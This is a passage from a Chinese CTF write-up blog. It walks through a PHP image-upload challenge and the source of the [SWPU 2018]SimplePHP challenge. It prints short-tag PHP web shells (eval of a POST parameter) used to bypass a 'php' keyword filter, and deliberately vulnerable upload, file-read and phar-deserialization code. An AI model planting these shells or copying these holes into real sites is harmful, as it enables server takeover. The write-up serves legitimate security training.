class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]);<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>])){<br>        <span class="hljs-variable">$whtie_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"image/jpeg"</span>);<br>        <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$filetype</span>,<span class="hljs-variable">$whtie_list</span>)){<br>            <span class="hljs-variable">$img_info</span> = @<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$img_info</span>){<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$img_info</span>[<span class="hljs-number">0</span>]&lt;=<span class="hljs-number">20</span> &amp;&amp; <span class="hljs-variable">$img_info</span>[<span class="hljs-number">1</span>]&lt;=<span class="hljs-number">20</span>){<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>())){<br>                        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>());<br>                    }<br>                    <span class="hljs-variable">$save_path</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>().<span class="hljs-string">"/"</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];<br>                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<span class="hljs-variable">$save_path</span>);<br>                    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$save_path</span>);<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/php/i"</span>,<span class="hljs-variable">$content</span>)){<br>                        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>);<br>                        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$save_path</span>);<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"hacker!!!"</span>);<br>                    }<span class="hljs-keyword">else</span>{<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">"upload success!! upload/your_sessionid/your_filename"</span>;<br>                    }<br>                }<span class="hljs-keyword">else</span>{<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">"image hight and width must less than 20"</span>);<br>                }<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid file head"</span>);<br>            }<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid file type!image/jpeg only!!"</span>);<br>        }<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"welcome.jpg"</span>)).<span class="hljs-string">'"&gt;'</span>;<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里不分析了，我黑盒做，当时上传，首先没限制后缀，然后是mime类型只能为jpeg，后面修改完之后，说文件头无效，这里用了几个似乎只有GIF89a才行。</p>
<p>随后又出来说图片的高度与宽度必须小于20，这里就蒙了，不知道如何限制，网上找了半天，还以为用工具来修改，看了wp发现代码即可。。。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312194518200.png" alt="image-20240312194518200"></p>
<p>如下图，直接宏定义完美解决</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211035922.png" alt="image-20240312211035922"></p>
<p>这里由于还会检测文件内容是否含有php字符，因此需要短标签绕过，这里借用人家的总结了</p>
<h2 id="php短标签绕过">php短标签绕过</h2>
<p>php中最常见的标签为<!--?php ?--></p>
<p>不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是：</p>
<blockquote>
<p>①<!--? ?--> 仅在配置short_open_tag=on时可以使用，适合执行php语句；</p>
<p>②<!--?= ?-->即使配置short_open_tag=off时依然可以使用，相当于<!--?php echo ?-->，适合输出php语句~</p>
</blockquote>
<p>上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;?  <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);?&gt;<br><br>&lt;?= <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);?&gt;<br><br>&lt;?  <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);<br><br>&lt;?= <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);<br></code></pre></td></tr></tbody></table></figure>
<p>但这里不知为何，似乎必须用有=符号的（因为配置问题）。上传之后，常规找flag即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211554502.png" alt="image-20240312211554502"></p>
<h1>[SWPUCTF 2023 秋季新生赛]NSS_HTTP_CHEKER</h1>
<p>老生常谈的http协议知识：不赘述了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313160430851.png" alt="image-20240313160430851"></p>
<h1>[SWPU 2018]SimplePHP</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313161413778.png" alt="image-20240313161413778"></p>
<p>base.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;!DOCTYPE html&gt; <br>&lt;html&gt; <br>&lt;head&gt; <br>    &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt; <br>    &lt;title&gt;web3&lt;/title&gt; <br>    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; <br>    &lt;script src=<span class="hljs-string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; <br>    &lt;script src=<span class="hljs-string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>" <span class="hljs-title">role</span>="<span class="hljs-title">navigation</span>"&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>"&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>"&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>="<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>" <span class="hljs-title">href</span>="<span class="hljs-title">index</span>.<span class="hljs-title">php</span>"&gt;首页&lt;/<span class="hljs-title">a</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>="<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>"&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">active</span>"&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>="&gt;查看文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>"&gt;上传文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>="<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>"&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">index</span>.<span class="hljs-title">php</span>"&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>="<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>"&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>['<span class="hljs-title">REMOTE_ADDR</span>'];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span><br><span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>upload_file.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">'function.php'</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;html&gt; <br>&lt;head&gt; <br>&lt;meta charest=<span class="hljs-string">"utf-8"</span>&gt; <br>&lt;title&gt;文件上传&lt;/title&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>&lt;div align = <span class="hljs-string">"center"</span>&gt; <br>        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; <br>&lt;/div&gt; <br>&lt;style&gt; <br>    p{ margin:<span class="hljs-number">0</span> auto} <br>&lt;/style&gt; <br>&lt;div&gt; <br>&lt;form action=<span class="hljs-string">"upload_file.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt; <br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">"file"</span>&gt;文件名:&lt;/label&gt; <br>    &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"file"</span> id=<span class="hljs-string">"file"</span>&gt;&lt;br&gt; <br>    &lt;input type=<span class="hljs-string">"submit"</span> name=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"提交"</span>&gt; <br>&lt;/div&gt; <br><br>&lt;/script&gt; <br>&lt;/body&gt; <br>&lt;/html&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>继续查看function.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">"base.php"</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type: text/html;charset=utf-8"</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>{ <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]).<span class="hljs-string">".jpg"</span>;<span class="hljs-comment">//随机命名文件名 </span><br>    <span class="hljs-comment">//mkdir("upload",0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>)) { <span class="hljs-comment">//应该是防止文件名重复，导致覆盖</span><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    } <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>); <span class="hljs-comment">//没毛病就上传</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; <br>} <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>{ <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) { <br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    } <br>} <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>{ <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"gif"</span>,<span class="hljs-string">"jpeg"</span>,<span class="hljs-string">"jpg"</span>,<span class="hljs-string">"png"</span>); <br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">"."</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]); <span class="hljs-comment">//按照.符号将文件名分割开成数组</span><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <span class="hljs-comment">//数组的指针指向数组的最后一个单元，这里就是后缀名</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) { <br>        <span class="hljs-comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span><br>    } <br>    <span class="hljs-keyword">else</span>{ <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) { <span class="hljs-comment">//白名单过滤</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        } <br>        <span class="hljs-keyword">else</span> { <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        } <br>    } <br>} <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
<p>最后看一下查看文件：file.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"content-type:text/html;charset=utf-8"</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">'function.php'</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">'class.php'</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/var/www/html/'</span>); <span class="hljs-comment">//限制了目录</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>] : <span class="hljs-string">""</span>; <span class="hljs-comment">//查看指定文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) { <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; <br>} <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) { <span class="hljs-comment">//如果文件存在，则调用show函数展示</span><br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)){ <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">'file doesn\'t exists.'</span>); <br>} <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
<p>再看一下class.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">'str'</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="hljs-variable">$this</span>-&gt;source)) {<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!'</span>);<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        }<br>        <br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source)) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker~"</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;<br>        }<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) {<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">"index.php"</span>;<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>分析了一波上述文件代码，重点联动的就是上传文件和查看文件了，一般有这俩功能的站点，大概率就会有phar反序列化吧。</p>
<p>查看文件里面没啥说的，主要就是调用class.php里面的类方法。第一个注意的就是function.php里面对于上传的文件的处理：在这里首先限制了文件名后缀（且仅有这种限制），只修要修改后缀即可，没啥说的。</p>
